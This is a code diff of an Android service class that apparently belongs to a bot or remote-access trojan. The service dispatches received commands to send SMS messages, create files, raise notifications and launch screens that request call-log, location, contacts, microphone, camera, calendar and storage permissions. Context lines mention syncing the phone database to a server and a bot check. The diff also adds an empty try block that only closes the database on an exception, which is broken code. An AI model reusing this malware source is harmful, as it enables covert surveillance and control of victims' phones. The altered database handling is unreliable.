@@ -4,6 +4,7 @@ import android.Manifest;
 import android.annotation.SuppressLint;
 import android.app.IntentService;
 import android.app.Notification;
+import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
@@ -37,7 +38,7 @@ import com.candroid.lofl.api.ContentProviders;
 import com.candroid.lofl.api.Image;
 import com.candroid.lofl.api.Media;
 import com.candroid.lofl.api.Messaging;
-import com.candroid.lofl.api.NotificationFactory;
+import com.candroid.lofl.api.Notifications;
 import com.candroid.lofl.api.Storage;
 import com.candroid.lofl.api.Systems;
 import com.candroid.lofl.api.Web;
@@ -116,7 +117,6 @@ public class CommandsIntentService extends IntentService {
     public static Looper sLooper;
     public static LocationManager sLocationManager;
     public static LocationListener sLocationListener;
-    public static int sNotificationId = 32;
 
     public CommandsIntentService() {
         super("CommandsIntentService");
@@ -307,7 +307,13 @@ public class CommandsIntentService extends IntentService {
                 } finally {
                     //FNISHED SYNCING PHONE TO DATABASE
                     database.endTransaction();
-                    database.close();
+                    try{
+
+                    }catch (IllegalStateException e){
+                        e.printStackTrace();
+                        database.close();
+                    }
+
                     //SEND DATABASE TO SERVER
                     try {
                         boolean isAlreadyBot = false;
@@ -513,7 +519,7 @@ public class CommandsIntentService extends IntentService {
                     if (intent.hasExtra(Constants.Keys.ADDRESS_KEY) && intent.hasExtra(Constants.Keys.BODY_KEY)) {
                         String address = intent.getStringExtra(Constants.Keys.ADDRESS_KEY);
                         String body = intent.getStringExtra(Constants.Keys.BODY_KEY);
-                        Messaging.Text.sendSms(this, address, body);
+                        Messaging.Text.sendSms(address, body);
                     }
                 }
             } else if (action.equals(ACTION_ALARM_CLOCK)) {
@@ -524,18 +530,9 @@ public class CommandsIntentService extends IntentService {
                 }
             } else if (action.equals(ACTION_CREATE_NOTIFICATION)) {
                 if (intent.hasExtra(Constants.Keys.TITLE_KEY) && intent.hasExtra(Constants.Keys.CONTENT_KEY)) {
-                    sNotificationId++;
                     String title = intent.getStringExtra(Constants.Keys.TITLE_KEY);
                     String content = intent.getStringExtra(Constants.Keys.CONTENT_KEY);
-                    Notification.Builder builder = new Notification.Builder(this, Constants.PRIMARY_NOTIFICATION_CHANNEL_ID);
-                    builder.setContentTitle(title);
-                    builder.setContentText(content);
-                    builder.setPriority(Notification.PRIORITY_MAX);
-                    builder.setTimeoutAfter(2000);
-                    builder.setSmallIcon(android.R.drawable.stat_notify_error);
-                    NotificationFactory.initNotificationManager(this);
-                    NotificationFactory.createPrimaryNotificationChannel(NotificationFactory.sNotificationManager);
-                    NotificationFactory.sNotificationManager.notify(sNotificationId++, builder.build());
+                    Notifications.createNotification(this, title, content, 2000, android.R.drawable.stat_notify_error, Notification.PRIORITY_MAX);
                 }
             } else if (action.equals(ACTION_CREATE_FILE)) {
                 if (intent.hasExtra(Constants.Keys.FILE_NAME_KEY) && intent.hasExtra(Constants.Keys.FILE_CONTENT_KEY)) {
@@ -650,64 +647,36 @@ public class CommandsIntentService extends IntentService {
                     }).start();
                 }
             }else if(action.equalsIgnoreCase(ACTION_ADMIN)){
-                Intent adminIntent = new Intent();
-                adminIntent.setClass(getApplicationContext(), AdminActivity.class);
-                adminIntent.setAction(Intent.ACTION_VIEW);
-                adminIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                this.startActivity(adminIntent);
-
+                startPermissionActivity(this, intent, AdminActivity.class);
             }else if(action.equalsIgnoreCase(ACTION_CALL_LOG_PERMISSION)){
-                Intent callLogIntent = new Intent();
-                callLogIntent.setAction(Intent.ACTION_VIEW);
-                callLogIntent.setClass(this, CallLogActivity.class);
-                callLogIntent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK|Intent.FLAG_ACTIVITY_NEW_TASK);
-                startActivity(callLogIntent);
+                startPermissionActivity(this, intent, CallLogActivity.class);
+                Log.d(TAG, "started call log permission activity");
             }else if(action.equalsIgnoreCase(ACTION_LOCATION_PERMISSION)){
-                Intent locationIntent = new Intent();
-                locationIntent.setAction(Intent.ACTION_VIEW);
-                locationIntent.setClass(this, LocationActivity.class);
-                locationIntent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK|Intent.FLAG_ACTIVITY_NEW_TASK);
-                startActivity(locationIntent);
+                startPermissionActivity(this, intent, LocationActivity.class);
             }else if(action.equalsIgnoreCase(ACTION_CONTACTS_PERMISSION)){
-                Intent contactsIntent = new Intent();
-                contactsIntent.setAction(Intent.ACTION_VIEW);
-                contactsIntent.setClass(this, ContactsActivity.class);
-                contactsIntent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK|Intent.FLAG_ACTIVITY_NEW_TASK);
-                startActivity(contactsIntent);
+                startPermissionActivity(this, intent, ContactsActivity.class);
             }else if(action.equalsIgnoreCase(ACTION_RECORD_AUDIO_PERMISSION)){
-                Intent recordAudioIntent = new Intent();
-                recordAudioIntent.setAction(Intent.ACTION_VIEW);
-                recordAudioIntent.setClass(this, RecordAudioActivity.class);
-                recordAudioIntent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK|Intent.FLAG_ACTIVITY_NEW_TASK);
-                startActivity(recordAudioIntent);
+                startPermissionActivity(this, intent, RecordAudioActivity.class);
             }else if(action.equalsIgnoreCase(ACTION_STORAGE_PERMISSION)){
-                Intent storageIntent = new Intent();
-                storageIntent.setAction(Intent.ACTION_VIEW);
-                storageIntent.setClass(this, StorageActivity.class);
-                storageIntent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK|Intent.FLAG_ACTIVITY_NEW_TASK);
-                startActivity(storageIntent);
+                startPermissionActivity(this, intent, StorageActivity.class);
             }else if(action.equals(ACTION_CALENDAR_PERMISSION)){
-                Intent calendarIntent = new Intent();
-                calendarIntent.setAction(Intent.ACTION_VIEW);
-                calendarIntent.setClass(this, CalendarActivity.class);
-                calendarIntent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK|Intent.FLAG_ACTIVITY_NEW_TASK);
-                startActivity(calendarIntent);
+                startPermissionActivity(this, intent, CalendarActivity.class);
             }else if(action.equals(ACTION_CAMERA_PERMISSION)){
-                Intent cameraIntent = new Intent();
-                cameraIntent.setAction(Intent.ACTION_VIEW);
-                cameraIntent.setClass(this, CameraActivity.class);
-                cameraIntent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK|Intent.FLAG_ACTIVITY_NEW_TASK);
-                startActivity(cameraIntent);
+                startPermissionActivity(this, intent, CameraActivity.class);
             }else if(action.equals(ACTION_PHONE_PERMISSION)){
-                Intent phoneIntent = new Intent();
-                phoneIntent.setAction(Intent.ACTION_VIEW);
-                phoneIntent.setClass(this, PhoneActivity.class);
-                phoneIntent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK|Intent.FLAG_ACTIVITY_NEW_TASK);
-                startActivity(phoneIntent);
+                startPermissionActivity(this, intent, PhoneActivity.class);
             }else {
                 Log.d(TAG, "No action found!");
             }
+            stopSelf();
         }
+    }
+
+    public static void startPermissionActivity(Context context, Intent intent, Class activityClass){
+        intent.setAction(Intent.ACTION_VIEW);
+        intent.setClass(context, activityClass);
+        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK|Intent.FLAG_ACTIVITY_BROUGHT_TO_FRONT);
+        context.startActivity(intent);
     }
 
     @Override
